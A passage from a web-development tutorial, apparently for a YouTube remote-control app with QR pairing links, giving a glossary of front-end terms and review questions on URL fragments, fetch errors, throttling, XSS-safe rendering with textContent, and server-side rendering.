  mitigated by `textContent` rendering and the CSP (ADR 0009).

## Glossary

| Term | Meaning here |
|---|---|
| Separation of concerns (HTML/CSS/JS) | Structure, appearance and behaviour in separate files |
| DOM | The browser's tree of objects built from the HTML |
| Semantic HTML | Elements chosen for meaning (`<button>`, `<main>`), not looks |
| Viewport meta tag | Makes phones use their real screen width |
| `defer` | Run the script after the document is parsed |
| `data-*` attribute / `dataset` | Custom attributes, read from JS as `element.dataset` |
| ARIA / assistive technology | Accessibility attributes / screen readers and similar tools |
| Declarative markup | HTML says what (`data-path`); one piece of code does how |
| SVG | Vector graphics described as shapes and paths |
| CSS custom properties / design tokens | `--name` variables / named reusable design values |
| `prefers-color-scheme` | Media query for the device's light or dark theme |
| `box-sizing: border-box` | Width includes padding and border |
| Flexbox | CSS layout for aligning items in a row or column |
| Progressive enhancement | Fallback first, newer feature after, for older browsers |
| Attribute selector | CSS matching elements by attribute value |
| `:focus-visible` | Focus styling only for keyboard navigation |
| Strict mode | JavaScript mode that turns silent mistakes into errors |
| URL fragment | The part after `#`, never sent to the server |
| `history.replaceState` | Change the address bar without reloading |
| `localStorage` / origin | Per-site persistent browser storage / scheme + host + port |
| Promise | An object for a result that arrives later; used with `await` |
| `fetch` | Browser HTTP function; throws only on network failure |
| Choke point | The single function all requests pass through |
| XSS | Cross-site scripting: making a page run an attacker's script |
| `textContent` vs `innerHTML` | Set text as text vs parse it as HTML |
| Nullish coalescing (`??`) | Default only for `null`/`undefined` |
| Destructuring | Pulling named properties out of an object |
| Polling / WebSocket / Server-Sent Events | Asking repeatedly / two-way connection / server push stream |
| Page Visibility API | `document.hidden` and `visibilitychange` |
| Coalesce / debounce / throttle | Send latest when free / after input stops / at most once per interval |
| State machine | Named states and the events that move between them |
| Client- vs server-side rendering | HTML built in the browser vs on the server |
| `string.Template` / `html.escape` | Placeholder filling / making text safe for HTML |
| QR error correction / quiet zone | Redundancy for damaged codes / required blank border |

## Check your understanding

1. The token in a pairing link comes after `#`, not after `?`. Why does that
   matter for the server's log?
2. A YouTube video titled `<b>Hello</b>` plays. What does the page show, and what
   would it show — and risk — if `renderState` used `innerHTML`?
3. `fetch("/api/next")` returns a 409. Does `await fetch(...)` throw? Where in
   `app.js` is the 409 turned into a message?
4. Replace the `setTimeout` chain with `setInterval(refresh, 1000)`. What goes
   wrong when the server takes 3 s to answer?
5. You drag the volume slider from 20 to 80 in half a second. Roughly how many
   requests are sent, and which value is guaranteed to be sent last? Why not
   debounce instead?
6. Why does JavaScript set `data-status` instead of hiding the play icon
   directly? What changes if you want the paused state to show a different
   colour?
7. The pairing page uses no JavaScript and is built on the server. Give two
   reasons that suits this page better than fetching the data from an API.
8. What happened before the damaged-link fix when a pairing link ended in a lone
   `%`, and why did one bad value break the whole page?
9. Why are the QR codes drawn black on white even in dark mode?
